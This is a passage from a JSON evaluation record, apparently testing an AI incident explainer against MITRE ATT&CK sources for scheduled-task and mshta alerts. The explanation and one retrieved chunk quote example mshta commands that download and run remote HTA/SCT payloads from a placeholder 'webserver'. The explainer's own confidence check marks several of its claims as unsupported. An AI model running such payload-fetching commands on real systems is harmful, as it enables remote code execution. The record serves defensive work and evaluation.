+            "document": "Scheduled Task Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WM",
+            "metadata": {
+              "tactics": "execution, persistence, privilege-escalation",
+              "source_type": "mitre_technique",
+              "technique_name": "Scheduled Task",
+              "technique_id": "T1053.005"
+            },
+            "score": 0.48060274261732705
+          },
+          {
+            "chunk_id": "mitre:T1053.005:0",
+            "document": "Scheduled Task",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "technique_name": "Scheduled Task",
+              "technique_id": "T1053.005",
+              "tactics": "execution, persistence, privilege-escalation"
+            },
+            "score": 0.4777234040735668
+          }
+        ]
+      }
+    },
+    {
+      "host": "SPOTCHECK-10",
+      "ground_truth": {
+        "expected_rule_title": "Suspicious Mshta Execution",
+        "expected_technique_id": "T1218.005"
+      },
+      "incident": {
+        "incident_id": 12,
+        "title": "Suspicious Mshta Execution on SPOTCHECK-10",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1218.005"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 12,
+        "explanation": "## What happened  \nA process named **mshta.exe** was launched on the machine **SPOTCHECK‑10** and flagged as suspicious. Mshta is a legitimate Windows utility that runs HTML Application (HTA) files or inline scripts. The alert indicates the attacker may have tried to use it to execute a malicious HTA, JavaScript, or VBScript payload.\n\n## Why it matters  \nThe activity maps to **MITRE ATT&CK technique T1218.005 – Mshta**. This technique describes how adversaries abuse `mshta.exe` to proxy code execution, often by pointing it at a remote HTA file (e.g., `mshta http://webserver/payload.hta`) or an inline script such as `mshta vbscript:Close(Execute(\"GetObject(\"\"script:https://webserver/payload.sct\"\")\"))`. Because mshta runs outside the browser’s security context, it can bypass application‑control or web‑filtering defenses and execute code stealthily.\n\n## Recommended next steps  \n1. **Collect forensic data** – capture the full command line, parent process, and any network connections associated with the mshta.exe instance (e.g., use Sysmon or Windows Event logs).  \n2. **Isolate the host** – place SPOTCHECK‑10 on a quarantine VLAN or disable its network interface to prevent further payload download.  \n3. **Search for related artifacts** – look for newly created `.hta`, `.js`, `.vbs`, or `.sct` files and any scheduled tasks or services that reference them.  \n4. **Block or monitor mshta usage** – add a rule to your application‑control or endpoint‑detection platform to alert on or restrict `mshta.exe` executions, especially those that reference remote URLs.  \n\n**Confidence check:**\n- The draft states that a process named mshta.exe was launched on the machine SPOTCHECK‑10 and flagged as suspicious, but the source chunks do not mention any specific host, execution event, or alert.  \n- The recommendation to “collect forensic data – capture the full command line, parent process, and any network connections … (e.g., use Sysmon or Windows Event logs)” is not supported by the provided sources.  \n- The suggestion to “isolate the host – place SPOTCHECK‑10 on a quarantine VLAN or disable its network interface” is not mentioned in the sources.  \n- The advice to “search for newly created .hta, .js, .vbs, or .sct files” includes .js and .vbs file types that are not referenced in the source material (which only cites .hta and .sct).  \n- The recommendation to “block or monitor mshta usage … add a rule to your application‑control or endpoint‑detection platform” is not covered by the source chunks.  \n- The claim that mshta can bypass “web‑filtering defenses” is not supported; the sources discuss bypassing application‑control solutions and browser security settings, but not web‑filtering.",
+        "recommended_response": "1. **Collect forensic data** – capture the full command line, parent process, and any network connections associated with the mshta.exe instance (e.g., use Sysmon or Windows Event logs).  \n2. **Isolate the host** – place SPOTCHECK‑10 on a quarantine VLAN or disable its network interface to prevent further payload download.  \n3. **Search for related artifacts** – look for newly created `.hta`, `.js`, `.vbs`, or `.sct` files and any scheduled tasks or services that reference them.  \n4. **Block or monitor mshta usage** – add a rule to your application‑control or endpoint‑detection platform to alert on or restrict `mshta.exe` executions, especially those that reference remote URLs.",
+        "sources": [
+          {
+            "chunk_id": "mitre:T1218.005:0",
+            "document": "Mshta Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)",
+            "metadata": {
+              "technique_id": "T1218.005",
+              "technique_name": "Mshta",
+              "source_type": "mitre_technique",
+              "tactics": "stealth"
+            },
+            "score": 0.456527207386889
+          },
+          {
+            "chunk_id": "mitre:T1218.005:1",
+            "document": "nd technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications) Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code> They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code> Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+            "metadata": {
+              "technique_id": "T1218.005",
+              "tactics": "stealth",
+              "technique_name": "Mshta",
+              "source_type": "mitre_technique"
+            },
+            "score": 0.42486839682810207
+          }
+        ]
+      }
+    }
+  ]
+}
